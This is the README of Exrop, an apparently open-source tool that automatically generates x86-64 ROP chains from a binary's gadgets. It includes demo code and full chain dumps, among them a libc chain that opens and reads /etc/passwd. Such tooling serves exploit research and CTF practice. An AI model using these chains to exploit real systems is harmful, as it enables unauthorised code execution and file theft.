# Exrop
Exrop is automatic ROP chains generator tool which can build gadget chain automatically from given binary and constraints

Requirements : [Triton](https://github.com/JonathanSalwan/Triton), [ROPGadget](https://github.com/JonathanSalwan/ROPgadget)

Only support for x86-64 for now!

Features:
- handling non-return gadgets (jmp reg, call reg)
- set registers (`rdi=0xxxxxx, rsi=0xxxxxx`)
- set register to register (`rdi=rax`)
- write to mem
- write string/bytes to mem
- function call (`open('/etc/passwd',0)`)
- pass register in function call (`read('rax', bss, 0x100)`)
- avoiding badchars
- stack pivoting (`Exrop.stack_pivot`)
- syscall (`Exrop.syscall`)
- see [examples](examples)

# installation
1. install python (3.6 is recomended and tested)
2. install triton (https://triton.quarkslab.com/documentation/doxygen/index.html#linux_install_sec), make sure you add `-DPYTHON36=on` as cmake option
3. install ropgadget (https://github.com/JonathanSalwan/ROPgadget)
4. to install exrop, easily add `export PYTHONPATH=/path/to/exrop:$PYTHONPATH` in your `.bashrc` (depends on your shell)

# demo
``` python
from Exrop import Exrop

rop = Exrop("/bin/ls")
rop.find_gadgets(cache=True)
print("write-regs gadgets: rdi=0x41414141, rsi:0x42424242, rdx: 0x43434343, rax:0x44444444, rbx=0x45454545")
chain = rop.set_regs({'rdi':0x41414141, 'rsi': 0x42424242, 'rdx':0x43434343, 'rax':0x44444444, 'rbx': 0x45454545})
chain.dump()
print("write-what-where gadgets: [0x41414141]=0xdeadbeefff, [0x43434343]=0x110011")
chain = rop.set_writes({0x41414141: 0xdeadbeefff, 0x43434343: 0x00110011})
chain.dump()
print("write-string gadgets 0x41414141=\"Hello world!\\n\"")
chain = rop.set_string({0x41414141: "Hello world!\n"})
chain.dump()
print("func-call gadgets 0x41414141(0x20, 0x30, \"Hello\")")
chain = rop.func_call(0x41414141, (0x20, 0x30, "Hello"), 0x7fffff00)
chain.dump()
```
Output:
```
write-regs gadget: rdi=0x41414141, rsi:0x42424242, rdx: 0x43434343, rax:0x44444444, rbx=0x45454545
$RSP+0x0000 : 0x00000000000060d0 # pop rbx; ret
$RSP+0x0008 : 0x0000000044444444
$RSP+0x0010 : 0x0000000000014852 # mov rax, rbx; pop rbx; ret
$RSP+0x0018 : 0x0000000000000000
$RSP+0x0020 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0028 : 0x0000000041414141
$RSP+0x0030 : 0x000000000000629c # pop rsi; ret
$RSP+0x0038 : 0x0000000042424242
$RSP+0x0040 : 0x0000000000003a62 # pop rdx; ret
$RSP+0x0048 : 0x0000000043434343
$RSP+0x0050 : 0x00000000000060d0 # pop rbx; ret
$RSP+0x0058 : 0x0000000045454545

write-what-where gadgets: [0x41414141]=0xdeadbeefff, [0x43434343]=0x110011
$RSP+0x0000 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0008 : 0x000000deadbeefff
$RSP+0x0010 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0018 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0020 : 0x0000000041414139
$RSP+0x0028 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret
$RSP+0x0030 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0038 : 0x0000000000110011
$RSP+0x0040 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0048 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0050 : 0x000000004343433b
$RSP+0x0058 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret

write-string gadgets 0x41414141="Hello world!\n"
$RSP+0x0000 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0008 : 0x6f77206f6c6c6548
$RSP+0x0010 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0018 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0020 : 0x0000000041414139
$RSP+0x0028 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret
$RSP+0x0030 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0038 : 0x0000000a21646c72
$RSP+0x0040 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0048 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0050 : 0x0000000041414141
$RSP+0x0058 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret

func-call gadgets 0x41414141(0x20, 0x30, "Hello")
$RSP+0x0000 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0008 : 0x0000006f6c6c6548
$RSP+0x0010 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0018 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0020 : 0x000000007ffffef8
$RSP+0x0028 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret
$RSP+0x0030 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0038 : 0x0000000000000020
$RSP+0x0040 : 0x000000000000629c # pop rsi; ret
$RSP+0x0048 : 0x0000000000000030
$RSP+0x0050 : 0x0000000000003a62 # pop rdx; ret
$RSP+0x0058 : 0x000000007fffff00
$RSP+0x0060 : 0x0000000041414141

python3 tests.py  1,48s user 0,05s system 97% cpu 1,566 total

```
Another example: open-read-write gadgets!

``` python
from pwn import *
import time
from Exrop import Exrop

binname = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(binname, checksec=False)
open = libc.symbols['open']
read = libc.symbols['read']
write = libc.symbols['write']
bss = libc.bss()

t = time.mktime(time.gmtime())
rop = Exrop(binname)
rop.find_gadgets(cache=True)
print("open('/etc/passwd', 0)")
chain = rop.func_call(open, ("/etc/passwd", 0), bss)
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("read('rax', bss, 0x100)") # register can be used as argument too!
chain = rop.func_call(read, ('rax', bss, 0x100))
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("write(1, bss, 0x100)")
chain = rop.func_call(write, (1, bss, 0x100))
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("done in {}s".format(time.mktime(time.gmtime()) - t))
```

Output:
```
open('/etc/passwd', 0)
$RSP+0x0000 : 0x00007ffff7a05a45 # pop r13 ; ret
$RSP+0x0008 : 0x00000000003ec860
$RSP+0x0010 : 0x00007ffff7a7630c # xor edi, edi ; pop rbx ; mov rax, rdi ; pop rbp ; pop r12 ; ret
$RSP+0x0018 : 0x00007ffff7a0555f
$RSP+0x0020 : 0x0000000000000000
$RSP+0x0028 : 0x0000000000000000
$RSP+0x0030 : 0x00007ffff7a06b8a # mov r9, r13 ; call rbx: next -> (0x0002155f) # pop rdi ; ret
$RSP+0x0038 : 0x00007ffff7a0555f # pop rdi ; ret
$RSP+0x0040 : 0x7361702f6374652f
$RSP+0x0048 : 0x00007ffff7b251c7 # mov qword ptr [r9], rdi ; ret
$RSP+0x0050 : 0x00007ffff7a05a45 # pop r13 ; ret
$RSP+0x0058 : 0x00000000003ec868
$RSP+0x0060 : 0x00007ffff7a7630c # xor edi, edi ; pop rbx ; mov rax, rdi ; pop rbp ; pop r12 ; ret
$RSP+0x0068 : 0x00007ffff7a0555f
$RSP+0x0070 : 0x0000000000000000
$RSP+0x0078 : 0x0000000000000000
$RSP+0x0080 : 0x00007ffff7a06b8a # mov r9, r13 ; call rbx: next -> (0x0002155f) # pop rdi ; ret
$RSP+0x0088 : 0x00007ffff7a0555f # pop rdi ; ret
$RSP+0x0090 : 0x0000000000647773
$RSP+0x0098 : 0x00007ffff7b251c7 # mov qword ptr [r9], rdi ; ret
$RSP+0x00a0 : 0x00007ffff7a62c70 # xor esi, esi ; mov rax, rsi ; ret
$RSP+0x00a8 : 0x00007ffff7a0555f # pop rdi ; ret
$RSP+0x00b0 : 0x00000000003ec860
$RSP+0x00b8 : 0x000000000010fc40

read('rax', bss, 0x100)
$RSP+0x0000 : 0x00007ffff7a71362 # mov dh, 0xc5 ; pop rbx ; pop rbp ; pop r12 ; ret
$RSP+0x0008 : 0x0000000000000000
$RSP+0x0010 : 0x0000000000000000
$RSP+0x0018 : 0x00007ffff7a0555f
$RSP+0x0020 : 0x00007ffff7aea899 # mov r8, rax ; call r12: next -> (0x0002155f) # pop rdi ; ret
$RSP+0x0028 : 0x00007ffff7b4a3b1 # pop rax ; pop rdx ; pop rbx ; ret
$RSP+0x0030 : 0x00007ffff79e5b96
$RSP+0x0038 : 0x0000000000000000
$RSP+0x0040 : 0x0000000000000000
$RSP+0x0048 : 0x00007ffff7a7fa08 # mov rdi, r8 ; call rax: next -> (0x00001b96) # pop rdx ; ret
$RSP+0x0050 : 0x00007ffff79e5b96 # pop rdx ; ret
$RSP+0x0058 : 0x0000000000000100
$RSP+0x0060 : 0x00007ffff7a07e6a # pop rsi ; ret
$RSP+0x0068 : 0x00000000003ec860
$RSP+0x0070 : 0x0000000000110070

write(1, bss, 0x100)
$RSP+0x0000 : 0x00007ffff7a0555f # pop rdi ; ret
$RSP+0x0008 : 0x0000000000000001
$RSP+0x0010 : 0x00007ffff79e5b96 # pop rdx ; ret
$RSP+0x0018 : 0x0000000000000100
$RSP+0x0020 : 0x00007ffff7a07e6a # pop rsi ; ret
$RSP+0x0028 : 0x00000000003ec860
$RSP+0x0030 : 0x0000000000110140

done in 3.0s (Running on: A9-9420 RADEON R5 2C+3G (2) @ 3.000GHz (using cached))
```
